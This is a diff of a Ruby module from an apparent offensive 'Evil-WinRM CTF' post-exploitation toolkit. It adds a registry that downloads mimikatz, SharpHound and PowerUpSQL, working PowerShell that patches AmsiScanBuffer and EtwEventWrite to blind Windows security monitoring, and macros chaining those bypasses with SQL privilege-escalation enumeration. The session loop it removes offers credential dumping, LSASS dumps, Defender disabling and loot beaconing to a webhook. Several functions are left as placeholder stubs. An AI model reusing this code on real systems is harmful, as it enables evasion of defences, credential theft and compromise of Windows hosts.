@@ -1,1492 +1,649 @@
-# lib/evil_ctf/session.rb
-
-require_relative 'shell_wrapper'
-
-require_relative 'banner'
-
-require_relative 'tools'
-
-require_relative 'uploader' # loads EvilCTF::Uploader
-
-require_relative 'enums'
-
-require_relative 'sql_enum'
-
+#!/usr/bin/env ruby
+# frozen_string_literal: true
+# Compatibility shim – define Fixnum for Ruby 3.x
+class Fixnum < Integer; end unless defined?(Fixnum)
+require 'fileutils'
+require 'zip'
+require 'uri'
+require 'net/http'
+require 'json'
+require 'base64'
+require 'digest/sha1'
 require 'readline'
-
-require 'timeout'
-
+require 'shellwords'
+require 'evil_ctf/crypto'
 require 'evil_ctf/uploader'
 
-
-
-
-
-
-
-
-module EvilCTF::Session
-
-  # Alias for the uploader helper
-
-@@ -18,6 +20,9 @@
-
-  # Main session loop & command handling
-
-  # ------------------------------------------------------------------
-
-  def self.run_session(session_options)
-
-
-
-
-    orig_ip = session_options[:ip]
-
-    host = session_options[:ip].match?(/:/) ? 'ipv6addr' : normalize_host(orig_ip)
-
-    add_ipv6_to_hosts(session_options[:ip].split('%')[0]) if session_options[:ip].match?(/:/)
-
-@@ -27,13 +32,9 @@
-
-    EvilCTF::ShellWrapper.socksify!(session_options[:proxy]) if session_options[:proxy]
-
-    puts "[*] Testing connection to #{orig_ip} (using #{host} in endpoint...)"
-
-
-
-
-    # Use Kerberos authentication if specified
-
-
-    if session_options[:kerberos]
-
-
-      unless session_options[:user] && session_options[:realm]
-
-
-        abort "[-] Kerberos requires --user and --realm"
-
-
-      end
-
-
-
-
-
-      conn = WinRM::Connection.new(
-
-        endpoint: endpoint,
-
-        user: session_options[:user],
-
-        password: '',
-
-@@ -42,311 +43,262 @@
-
-        keytab: session_options[:keytab],
-
-        no_ssl_peer_verification: true
-
-      )
-
-
-
-
-
-
-
-
-
-    else
-
-
-      # Use standard authentication methods
-
-
-      if session_options[:hash]
-
-
-        conn = WinRM::Connection.new(
-
-
-          endpoint: endpoint,
-
-
-          user: session_options[:user],
-
-
-          password: '',
-
-
-          transport: :negotiate,
-
-
-          no_ssl_peer_verification: true
-
-
-        )
-
-
-      else
-
-
-        conn = WinRM::Connection.new(
-
-
-          endpoint: endpoint,
-
-
-          user: session_options[:user],
-
-
-          password: session_options[:password],
-
-
-          no_ssl_peer_verification: true
-
-
-        )
-
-
-      end
-
-    end
-
-
-
-
-    shell = conn.shell(:powershell)
-
-
-    logger = SessionLogger.new(session_options[:logfile]) # <-- defined below
-
-
-    history = CommandHistory.new
-
-
-    command_manager = EvilCTF::Tools::CommandManager.new
-
-
-
-
-
-    # Setup PowerShell prompt and aliases
-
-
-    shell.run(%q{
-
-
-      function prompt {
-
-
-        "PS $pwd> "
-
-
+module EvilCTF::Tools
+  TOOL_REGISTRY = {
+    'sharphound' => {
+      name: 'SharpHound (BloodHound Collector)',
+      filename: 'SharpHound.exe',
+      search_patterns: ['SharpHound.exe', 'SharpHound*.exe'],
+      description: 'BloodHound AD collector',
+      url: 'https://github.com/SpecterOps/SharpHound',
+      download_url: 'https://github.com/SpecterOps/SharpHound/releases/latest/download/SharpHound.exe',
+      backup_urls: [
+        'https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe'
+      ],
+      zip: false,
+      recommended_remote: 'C:\\Users\\Public\\SharpHound.exe',
+      auto_execute: false,
+      category: 'recon'
+    },
+    'mimikatz' => {
+      name: 'Mimikatz',
+      filename: 'mimikatz.exe',
+      search_patterns: ['mimikatz.exe', 'mimikatz_x64.exe'],
+      description: 'Credential dumping tool',
+      url: 'https://github.com/ParrotSec/mimikatz',
+      download_url: 'https://github.com/ParrotSec/mimikatz/releases/latest/download/mimikatz_trunk.zip',
+      backup_urls: [
+        'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip'
+      ],
+      zip: true,
+      zip_pick_x64: 'mimikatz_trunk/x64/mimikatz.exe',
+      zip_pick_x86: 'mimikatz_trunk/win32/mimikatz.exe',
+      recommended_remote: 'C:\\Users\\Public\\mimikatz.exe',
+      auto_execute: false,
+      category: 'privilege'
+    },
+    # Added SQL-specific tools
+    'sql_server' => {
+      name: 'SQL Server Enumeration Tools',
+      filename: 'sql_tools.zip',
+      search_patterns: ['sql*.zip', 'sql*.exe'],
+      description: 'Collection of SQL Server enumeration and exploitation tools',
+      url: 'https://github.com/BC-SECURITY/Empire',
+      download_url: 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/modules/powershell/situational_awareness/network/sql/sql_tools.zip',
+      backup_urls: [
+        'https://github.com/PowerShellMafia/PowerSploit/archive/refs/heads/master.zip'
+      ],
+      zip: true,
+      recommended_remote: 'C:\\Users\\Public\\sql_tools',
+      auto_execute: false,
+      category: 'sql'
+    },
+    'powerupsql' => {
+      name: 'PowerUpSQL',
+      filename: 'PowerUpSQL.ps1',
+      search_patterns: ['PowerUpSQL.ps1', 'PowerUpSQL*.ps1'],
+      description: 'Advanced SQL Server enumeration and privilege escalation PowerShell module',
+      url: 'https://github.com/BC-SECURITY/Empire',
+      download_url: 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/modules/powershell/situational_awareness/network/sql/PowerUpSQL.ps1',
+      backup_urls: [
+        'https://github.com/PowerShellMafia/PowerSploit/archive/refs/heads/master.zip'
+      ],
+      zip: false,
+      recommended_remote: 'C:\\Users\\Public\\PowerUpSQL.ps1',
+      auto_execute: false,
+      category: 'sql'
+    },
+    'powershell_sql' => {
+      name: 'PowerShell SQL Tools',
+      filename: 'Invoke-SQLQuery.ps1',
+      search_patterns: ['Invoke-SQLQuery*.ps1'],
+      description: 'SQL Server query execution and enumeration PowerShell script',
+      url: 'https://github.com/PowerShellMafia/PowerSploit',
+      download_url: 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-SQLQuery.ps1',
+      backup_urls: [
+        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-SQLQuery.ps1'
+      ],
+      zip: false,
+      recommended_remote: 'C:\\Users\\Public\\Invoke-SQLQuery.ps1',
+      auto_execute: false,
+      category: 'sql'
+    },
+    # Rest of the tools...
+  }.freeze
+
+  # AMSI bypass script
+  BYPASS_4MSI_PS = <<~PS
+    $kernel32 = @"
+    using System; using System.Runtime.InteropServices;
+    public class kernel32 {
+        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+    }
+    "@
+    Add-Type $kernel32
+    $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
+    $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
+    $oldProtect = 0
+    [kernel32]::VirtualProtect($scanBuffer, [uint32]5, 0x40, [ref]$oldProtect) | Out-Null
+    $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 6)
+    "[+] AMSI bypassed (AmsiScanBuffer patched)"
+    try { IEX ("Am"+"siU"+"tils") } catch { "[+] Bypass confirmed" }
+  PS
+
+  # ETW bypass script
+  ETW_BYPASS_PS = <<~PS
+    $kernel32 = @"
+    using System; using System.Runtime.InteropServices;
+    public class kernel32 {
+        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+    }
+    "@
+    Add-Type $kernel32
+    $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
+    $funcs = @("EtwEventWrite","EtwEventWriteTransfer","EtwEventWriteFull","EtwEventWriteEx")
+    $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3)
+    foreach ($f in $funcs) {
+      $addr = [kernel32]::GetProcAddress($ntdll, $f)
+      if ($addr -ne 0) {
+        $old = 0
+        [kernel32]::VirtualProtect($addr, 4, 0x40, [ref]$old) | Out-Null
+        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 4)
       }
+    }
+    try {
+      $type = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+      $field = $type.GetField('etwProvider','NonPublic,Static')
+      $field.SetValue($null, [Activator]::CreateInstance("System.Diagnostics.Eventing.EventProvider", [Guid]::NewGuid()))
+    } catch {}
+    "[+] Full ETW bypass completed"
+  PS
 
-
-      Set-Alias __exit__ Exit-PSSession
-
-
-    })
-
-
-
-
-
-    puts "[+] Connected to #{orig_ip}"
-
-
-
-
-
-    # NEW: Use the new banner system with mode selection
-
-
-    banner_mode = session_options[:banner_mode] || :minimal
-
-
-    
-
-
-    # Backward compatibility: Check if new banner method exists, otherwise fall back to old method
-
-
-    if EvilCTF::Banner.respond_to?(:show_banner)
-
-
-      EvilCTF::Banner.show_banner(shell, session_options, mode: banner_mode)
-
-
-    else
-
-
-      # Fall back to original method for backward compatibility
-
-
-      EvilCTF::Banner.show_banner_with_flagscan(shell, session_options)
-
-
+  class CommandManager
+    def initialize
+      @aliases = {
+        'ls' => 'Get-ChildItem',
+        'dir' => 'Get-ChildItem',
+        'whoami' => '$env:USERNAME',
+        'pwd' => 'Get-Location',
+        'cd' => 'Set-Location',
+        'ps' => 'Get-Process',
+        'processes' => 'Get-Process',
+        'sysinfo' => 'systeminfo',
+        'services' => 'Get-Service',
+        'rm' => 'Remove-Item',
+        'cat' => 'Get-Content',
+        'mkdir' => 'New-Item -ItemType Directory',
+        'cp' => 'Copy-Item',
+        'mv' => 'Move-Item'
+      }
+      @macros = {
+        # Added SQL-specific macros
+        'sql_enum' => [
+          BYPASS_4MSI_PS,
+          ETW_BYPASS_PS,
+          '& "C:\\Users\\Public\\PowerUpSQL.ps1" -Verbose',
+          'Get-SQLServer; Get-SQLServerInstance; Get-SQLServerLogin; Get-SQLServerDatabase; Get-SQLServerPermission'
+        ],
+        'sql_priv_esc' => [
+          BYPASS_4MSI_PS,
+          ETW_BYPASS_PS,
+          '& "C:\\Users\\Public\\PowerUpSQL.ps1" -Verbose',
+          'Get-SQLServerPrivEsc; Get-SQLServerCLR'
+        ],
+        # Rest of the macros...
+      }
     end
 
-
-
-
-    setup_autocomplete(history)
-
-
-    enum_cache = {}
-
-
-
-
-
-
-    if session_options[:enum]
-
-
-      puts "[*] Running enumeration preset: #{session_options[:enum]}"
-
-
-      if session_options[:enum] == 'deep'
-
-
-        EvilCTF::Tools.safe_autostage('winpeas', shell, session_options, logger)
-
-
+    def expand_alias(cmd)
+      @aliases.each do |k, v|
+        return cmd.sub(k, v) if cmd.start_with?(k)
       end
-
-
-      if session_options[:enum] == 'dom'
-
-
-        EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-
-
-        shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
-
-
-      end
-
-
-      if session_options[:enum] == 'sql'
-
-
-        EvilCTF::SQLEnum.run_sql_enum(shell)
-
-      else
-
-
-        EvilCTF::Enums.run_enumeration(shell, type: session_options[:enum], cache: enum_cache,
-
-
-                       fresh: session_options[:fresh])
-
-      end
-
-
+      cmd
     end
 
-
-
-
-    puts "Type 'help' for commands, '__exit__' or 'exit' to quit, or !bash for local shell.\n\n"
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    # Main loop flag
-
-
-    should_exit = false
-
-
-
-
-    loop do
-
-
-      begin
-
-
-        Timeout.timeout(1800) do
-
-
-          prompt = shell.run('prompt').output
-
-
-          input = Readline.readline(prompt, true)
-
-
-          break if input.nil?
-
-
-          input = input.strip
-
-
-          next if input.empty?
-
-
-
-
-          if input =~ /^(exit|quit|__exit__)$/i
-
-
-            puts '[*] Exiting session...'
-
-
-            break
-
-
-          end
-
-
-
-
-
-
-
-
-          history.add(input)
-
-
-
-
-
-          case input
-
-
-          when /^help$/i
-
-
-            puts "\nBuiltin commands:"
-
-
-            puts ' help - This help'
-
-
-            puts ' clear - Clear screen'
-
-
-            puts ' tools - List tool registry'
-
-
-            puts ' download_missing - Download all missing tools into ./tools'
-
-
-            puts ' dump_creds - Stage mimikatz & dump logon passwords'
-
-
-            puts ' lsass_dump - Stage procdump & dump LSASS to ./loot'
-
-
-            puts ' enum [type] - Run enumeration preset (basic, deep, sql, etc.)'
-
-
-            puts ' fileops - File operations menu (upload/download/ZIP)'
-
-
-            puts ' bypass-4msi - Try AMSI bypass'
-
-
-            puts ' bypass-etw - Full ETW bypass'
-
-
-            puts ' disable_defender - Try disabling Defender real-time'
-
-
-            puts ' history - Show command history'
-
-
-            puts ' history clear - Clear history file'
-
-
-            puts ' profile save <name> - Save current options as profile'
-
-
-            puts ' get-unquotedservices - Show all unquoted service paths'  # NEW COMMAND
-
-
-            puts ' upload <local> <remote> - Upload file (original Evil-WinRM style)'
-
-
-            puts ' download <remote> <local> - Download file (original Evil-WinRM style)'
-
-
-            puts ' load_ps1 <local_ps1> - Upload and load PS1 script'
-
-
-            puts ' invoke-binary <local_bin> [args] - Upload and execute binary'
-
-
-            puts ' services - List services'
-
-
-            puts ' processes - List processes'
-
-
-            puts ' sysinfo - System info'
-
-
-            puts " __exit__/exit/quit - Exit this Evil-WinRM CTF session"
-
-
-            puts ' !sh / !bash - Spawn local shell'
-
-
-            puts "\nMacros: #{command_manager.list_macros.join(', ')}"
-
-
-            puts "Aliases: #{command_manager.list_aliases.join(', ')}"
-
-
-            next
-
-
-          when /^clear$/i
-
-
-            system('clear || cls')
-
-
-            next
-
-
-          when /^tools$/i
-
-
-            EvilCTF::Tools.list_available_tools
-
-
-            next
-
-
-          when /^download_missing$/i
-
-
-            EvilCTF::Tools.download_missing_tools
-
-
-            next
-
-
-          when /^dump_creds$/i
-
-
-            EvilCTF::Tools.safe_autostage('mimikatz', shell, session_options, logger)
-
-
-            EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-
-
-            command_manager.expand_macro('dump_creds', shell,
-
-
-                                        webhook: session_options[:webhook])
-
-
-            next
-
-
-          when /^lsass_dump$/i
-
-
-            EvilCTF::Tools.safe_autostage('procdump', shell, session_options, logger)
-
-
-            command_manager.expand_macro('lsass_dump', shell,
-
-
-                                        webhook: session_options[:webhook])
-
-
-            Uploader.download_file('C:\\Users\\Public\\lsass.dmp',
-
-
-                                  "loot/lsass_#{session_options[:ip]}.dmp",
-
-
-                                  shell)
-
-
-            next
-
-
-          when /^fileops$/i
-
-
-            Uploader.file_operations_menu(shell)
-
-
-            next
-
-
-          when /^enum(?:\s+(\S+))?$/i
-
-
-            t = Regexp.last_match(1) || 'basic'
-
-
-            if t == 'deep'
-
-
-              EvilCTF::Tools.safe_autostage('winpeas', shell, session_options, logger)
-
-            end
-
-
-            if t == 'dom'
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-              EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-
-
-              shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
-
-
-            end
-
-
-            if t == 'sql'
-
-
-              EvilCTF::SQLEnum.run_sql_enum(shell)
-
-
-            else
-
-
-              EvilCTF::Enums.run_enumeration(shell, type: t, cache: enum_cache,
-
-
-                              fresh: session_options[:fresh])
-
-
-            end
-
-
-            next
-
-
-          when /^dom_enum$/i
-
-
-            EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-
-
-            shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
-
-
-            EvilCTF::Enums.run_enumeration(shell, type: 'dom', cache: enum_cache,
-
-
-                              fresh: session_options[:fresh])
-
-
-            next
-
-
-          when /^disable_defender$/i
-
-
-            EvilCTF::Tools.disable_defender(shell)
-
-
-            next
-
-
-          when /^history$/i
-
-
-            history.show
-
-
-            next
-
-
-          when /^history\s+clear$/i
-
-
-            history.clear
-
-
-            puts '[+] History cleared'
-
-
-            next
-
-
-          when /^profile\s+save\s+(\S+)$/i
-
-
-            name = Regexp.last_match(1)
-
-
-            EvilCTF::Tools.save_config_profile(name, session_options)
-
-
-            next
-
-
-          # NEW: Unquoted Services Command
-
-
-          when /^get-unquotedservices$/i
-
-
-            puts "[*] Getting all unquoted service paths..."
-
-
-            unquoted_ps = <<~POWERSHELL
-
-
-              Get-CimInstance -Class Win32_Service | Where-Object { 
-
-
-                $_.PathName -notlike '`"*' -and $_.PathName -like '*.exe*' -and $_.PathName -like '* *'
-
-
-              } | Select-Object Name, DisplayName, PathName, State, StartMode | Format-Table -AutoSize
-
-
-            POWERSHELL
-
-
-            result = shell.run(unquoted_ps)
-
-
-            puts result.output
-
-
-            next
-
-
-          when /^tool\s+(\w+)$/i
-
-
-            key = Regexp.last_match(1)
-
-
-            if key == 'all'
-
-
-              puts "[*] Staging all tools..."
-
-
-              EvilCTF::Tools::TOOL_REGISTRY.each_key do |tool_key|
-
-
-                EvilCTF::Tools.safe_autostage(tool_key, shell, session_options, logger)
-
-              end
-
-
-            else
-
-
-              puts "[*] Staging tool: #{key}"
-
-
-              success = EvilCTF::Tools.safe_autostage(key, shell, session_options, logger)
-
-
-              if success
-
-
-                puts "[+] Tool '#{key}' staged successfully"
-
-
-                # Execute the tool based on its configuration with proper error handling
-
-
-                tool = EvilCTF::Tools::TOOL_REGISTRY[key]
-
-
-                if tool && tool[:recommended_remote]
-
-
-                  remote_path = tool[:recommended_remote]
-
-
-
-
-
-                  # Handle different tool types properly to avoid hanging and resource leaks
-
-
-                  case key
-
-
-                  when 'mimikatz'
-
-
-                    puts "[*] Executing mimikatz..."
-
-
-                    # For mimikatz, use PowerShell with timeout and proper cleanup to prevent hanging
-
-
-                    ps_cmd = <<~PS
-
-
-                      try {
-
-
-                        $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
-
-
-                        $proc.WaitForExit(30000) | Out-Null # Wait up to 30 seconds
-
-
-                        if ($proc.HasExited) {
-
-
-                          Write-Output "Mimikatz completed with exit code: $($proc.ExitCode)"
-
-
-                        } else {
-
-
-                          Write-Output "Mimikatz timed out after 30 seconds"
-
-
-                          $proc.Kill()
-
-
-                        }
-
-
-                      } catch {
-
-
-                        Write-Output "Error executing mimikatz: $_.Exception.Message"
-
-
-                      }
-
-
-                    PS
-
-
-                    result = shell.run(ps_cmd)
-
-
-                    puts result.output
-
-
-                  when 'winpeas'
-
-
-                    puts "[*] Executing winpeas..."
-
-
-                    # Use cmd.exe with proper timeout handling to avoid hanging and platform errors
-
-
-                    ps_cmd = <<~PS
-
-
-                      try {
-
-
-                        $proc = Start-Process -FilePath "cmd" -ArgumentList "/c #{remote_path}" -PassThru -WindowStyle Hidden
-
-
-                        $proc.WaitForExit(60000) | Out-Null # Wait up to 60 seconds
-
-
-                        if ($proc.HasExited) {
-
-
-                          Write-Output "WinPEAS completed with exit code: $($proc.ExitCode)"
-
-
-                        } else {
-
-
-                          Write-Output "WinPEAS timed out after 60 seconds"
-
-
-                          $proc.Kill()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                        }
-
-
-                      } catch {
-
-
-                        Write-Output "Error executing winpeas: $_.Exception.Message"
-
-
-                      }
-
-
-                    PS
-
-
-                    result = shell.run(ps_cmd)
-
-
-                    puts result.output
-
-
-                  when 'procdump'
-
-
-                    puts "[*] Executing procdump..."
-
-
-                    # Use cmd.exe with timeout handling to prevent hanging
-
-
-                    ps_cmd = <<~PS
-
-
-                      try {
-
-
-                        $proc = Start-Process -FilePath "cmd" -ArgumentList "/c #{remote_path}" -PassThru -WindowStyle Hidden
-
-
-                        $proc.WaitForExit(30000) | Out-Null # Wait up to 30 seconds
-
-
-                        if ($proc.HasExited) {
-
-
-                          Write-Output "Procdump completed with exit code: $($proc.ExitCode)"
-
-
-                        } else {
-
-
-                          Write-Output "Procdump timed out after 30 seconds"
-
-
-                          $proc.Kill()
-
-                        }
-
-
-                      } catch {
-
-
-                        Write-Output "Error executing procdump: $_.Exception.Message"
-
-
-                      }
-
-
-                    PS
-
-
-                    result = shell.run(ps_cmd)
-
-
-                    puts result.output
-
-
-                  when 'rubeus', 'seatbelt'
-
-
-                    puts "[*] Executing #{key}..."
-
-
-                    # Direct execution for these tools with timeout handling
-
-
-                    ps_cmd = <<~PS
-
-
-                      try {
-
-
-                        $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
-
-
-                        $proc.WaitForExit(30000) | Out-Null # Wait up to 30 seconds
-
-
-                        if ($proc.HasExited) {
-
-
-                          Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
-
-
-                        } else {
-
-
-                          Write-Output "#{key.capitalize} timed out after 30 seconds"
-
-
-                          $proc.Kill()
-
-                        }
-
-
-                      } catch {
-
-
-                        Write-Output "Error executing #{key}: $_.Exception.Message"
-
-
-                      }
-
-
-                    PS
-
-
-                    result = shell.run(ps_cmd)
-
-
-                    puts result.output
-
-
-                  when 'inveigh', 'powerview', 'sharphound'
-
-
-                    puts "[*] Executing #{key} PowerShell script..."
-
-
-                    # For PowerShell scripts, use proper execution with timeout and error handling
-
-
-                    ps_script = "IEX (Get-Content '#{remote_path}' -Raw) 2>&1"
-
-
-                    result = shell.run(ps_script)
-
-
-                    puts result.output
-
-
-                  when 'socksproxy'
-
-
-                    puts "[*] Executing SOCKS proxy PowerShell module..."
-
-
-                    # For PowerShell modules, proper execution with error handling
-
-
-                    ps_script = "Import-Module '#{remote_path}' 2>&1; Invoke-SocksProxy -Port 1080"
-
-
-                    result = shell.run(ps_script)
-
-
-                    puts result.output
-
-
-                  else
-
-
-                    # For other binary tools, use proper timeout and process management
-
-
-                    if remote_path.end_with?('.exe')
-
-                      puts "[*] Executing #{key}..."
-
-                      ps_cmd = <<~PS
-
-                        try {
-
-                          $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
-
-
-                          $proc.WaitForExit(30000) | Out-Null # Wait up to 30 seconds
-
-                          if ($proc.HasExited) {
-
-                            Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
-
-                          } else {
-
-@@ -359,62 +311,128 @@
-
-                      PS
-
-                      result = shell.run(ps_cmd)
-
-                      puts result.output
-
-
-
-
-
-
-
-
-
-
-
-                    else
-
-
-                      puts "[*] Tool staged. Execute manually with: #{remote_path}"
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                    end
-
-                  end
-
-
-
-                end
-
-
-              else
-
-
-                puts "[-] Failed to stage tool '#{key}'"
-
-              end
-
-
-
-
-
-            end
-
-
-            next
-
-
-          when /^!bash$/i, /^!sh$/i
-
-
-            puts '[*] Spawning local shell. Type "exit" to return.'
-
-
-            system(ENV['SHELL'] || '/bin/bash')
-
-
-            next
-
-
-          end
-
-
-
-
-          # Macro expansion
-
-
-          if command_manager.expand_macro(input, shell,
-
-
-                                         webhook: session_options[:webhook])
-
-
-            next
-
-
-          end
-
-
-
-
-          # Normal command path
-
-
-          cmd = command_manager.expand_alias(input)
-
-
-          start = Time.now
-
-
-          result = shell.run(cmd)
-
-
-          elapsed = Time.now - start
-
-
-          puts result.output
-
-
+    def expand_macro(name, shell, webhook: nil)
+      macro = @macros[name.downcase]
+      return false unless macro
+      puts "[*] Expanding macro: #{name}"
+      macro.each do |step|
+        begin
+          result = shell.run(step)
+          puts result.output.strip
           matches = EvilCTF::Tools.grep_output(result.output)
-
-
           if matches.any?
-
-
             EvilCTF::Tools.save_loot(matches)
-
-
-            EvilCTF::Tools.beacon_loot(session_options[:webhook], matches) if session_options[:webhook]
-
-
+            EvilCTF::Tools.beacon_loot(webhook, matches) if webhook
           end
-
-
-
-
-          logger.log_command(cmd, result, elapsed,
-
-
-                            '$PID', result.exitcode || 0)
-
-
-          sleep(rand(30..90)) if session_options[:beacon]
-
-
+        rescue => e
+          puts "[!] Macro step failed: #{e.message}"
         end
-
-
-      rescue Timeout::Error
-
-
-        puts "\n[!] Idle timeout — closing session"
-
-
-        break
-
-
-      rescue Interrupt
-
-
-        puts "\n[!] Ctrl-C detected; exiting."
-
-
-        break
-
-
-      rescue => e
-
-
-        # Handle connection errors gracefully to prevent resource leaks
-
-
-        puts "[!] Session error: #{e.message}"
-
-
-        if e.is_a?(WinRM::WinRMAuthorizationError) || e.is_a?(Net::HTTPServerException)
-
-
-          puts "[!] Connection lost - exiting cleanly"
-
-          break
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        end
-
-
-        raise e
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
       end
-
+      true
     end
 
+    def list_macros; @macros.keys.sort end
+    def list_aliases; @aliases.keys.sort end
+  end
 
+  # Helper functions for tool handling
+  def self.download_tool(key, remote_download: false, shell: nil)
+    tool = TOOL_REGISTRY[key]
+    return nil unless tool && (tool[:download_url] || tool[:backup_urls])
+    FileUtils.mkdir_p('tools')
+    path = File.join('tools', tool[:filename])
+    if File.exist?(path)
+      puts "[+] #{tool[:name]} already downloaded at #{path}"
+      return path
+    end
 
+    # SQL-specific download handling
+    if key == 'powerupsql'
+      puts "[*] Downloading PowerUpSQL module..."
+      path = File.join('tools', tool[:filename])
+      success = download_from_url(tool[:download_url], path)
+      if success && File.exist?(path)
+        puts "[+] PowerUpSQL module downloaded successfully"
+        return path
+      else
+        puts "[!] Failed to download PowerUpSQL. Try backup URLs."
+      end
+    end
 
-    shell.close
+    # Rest of the tool handling...
+  rescue => e
+    puts "[!] Error downloading #{key}: #{e.message}"
+    nil
+  end
 
-    puts '[+] Session closed.'
+  def self.download_from_url(url, path)
+    success = false
+    # Try curl
+    puts "[*] Trying curl..."
+    curl_cmd = "curl -L --fail -o #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
+    success = system("#{curl_cmd} > /dev/null 2>&1")
+    return success if success
+    # Rest of the download methods...
+  end
+
+  def self.download_missing_tools(remote_download: false, shell: nil)
+    failures = []
+    TOOL_REGISTRY.each do |key, tool|
+      puts "\n[*] Checking #{tool[:name]} (#{key})..."
+      unless download_tool(key, remote_download: remote_download, shell: shell)
+        failures << key
+      end
+    end
+
+    # SQL-specific handling for missing tools
+    if failures.include?('powerupsql')
+      puts "\n[!] PowerUpSQL is critical for SQL enumeration. Please manually download it."
+      puts "[*] Download URL: #{TOOL_REGISTRY['powerupsql'][:download_url]}"
+    end
+
+    # Rest of the tool handling...
+  end
+
+  def self.safe_autostage(tool_key, shell, options, logger)
+    tool = TOOL_REGISTRY[tool_key]
+    return false unless tool
+
+    remote_path = tool[:recommended_remote]
+    check_cmd = "if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }"
+    result = shell.run(check_cmd)
+    if result.output.include?('EXISTS')
+      puts "[+] #{tool[:name]} already staged at #{remote_path}"
+      return true
+    end
+
+    # Rest of the staging logic...
+  rescue => e
+    puts "[!] Staging failed for #{tool_key}: #{e.message}"
+    false
+  end
+
+  def self.execute_staged_tool(key, args = '', shell)
+    tool = TOOL_REGISTRY[key]
+    return false unless tool
+    remote_path = tool[:recommended_remote]
+
+    # SQL-specific execution handling
+    if key == 'powerupsql'
+      puts "[*] Executing PowerUpSQL..."
+      ps_cmd = <<~PS
+        try {
+          $proc = Start-Process -FilePath "#{remote_path}" -ArgumentList "Import-Module '#{remote_path}' -Force" -PassThru -WindowStyle Hidden
+          $proc.WaitForExit(60000) | Out-Null
+          if ($proc.HasExited) {
+            "Completed with exit code: $($proc.ExitCode)"
+          } else {
+            "Timed out after 60 seconds"
+            $proc.Kill()
+          }
+        } catch {
+          "Error: $_.Exception.Message"
+        }
+      PS
+    end
+
+    # Rest of the execution logic...
+  rescue => e
+    puts "[!] Execution failed for #{key}: #{e.message}"
+    false
+  end
+
+  def self.list_available_tools
+    puts "\n AVAILABLE TOOLS ".ljust(70, '=')
+    TOOL_REGISTRY.group_by { |_, v| v[:category] }.each do |cat, tools|
+      puts "\n #{cat.upcase}:"
+      tools.each do |key, t|
+        local_status = File.exist?(File.join('tools', t[:filename])) ? '📁' : '❌'
+        puts " [#{local_status}] #{t[:name]} (#{key}) - #{t[:description]}"
+
+        # SQL-specific tool information
+        if cat == 'sql'
+          puts "   [+] Recommended remote path: #{t[:recommended_remote]}"
+          puts "   [+] Suggested commands:"
+          puts "     * sql_enum - Run basic SQL enumeration"
+          puts "     * sql_priv_esc - Check for privilege escalation opportunities"
+        end
+      end
+    end
+
+    # Rest of the tool listing...
+  end
+
+  def self.grep_output(output)
+    return [] if output.nil? || output.empty?
+
+    # Add execution policy bypass check before attempting regex matching
+    if output.include?('execution policy') || output.include?('SecurityError')
+      puts "[!] PowerShell execution policy issue detected"
+      return []
+    end
+
+    matches = []
+
+    # SQL-specific patterns for better exploit detection
+    sql_patterns = [
+      /SQL Server\s+([0-9.]+)/,
+      /xp_cmdshell\s*[:=]\s*(1|true)/i,
+      /CLR\s*[:=]\s*(1|true)/i,
+      /LinkedServers/i,
+      /sql_logins/i,
+      /password_hash/i,
+      /NTLM\s*:\s*([A-F0-9]{32})/i,
+      /LM\s*:\s*([A-F0-9]{32})/i
+    ]
+
+    # Rest of the pattern matching logic...
+  end
+
+  def self.save_loot(matches)
+    return if matches.nil? || matches.empty?
+    FileUtils.mkdir_p('loot')
+
+    # SQL-specific loot handling
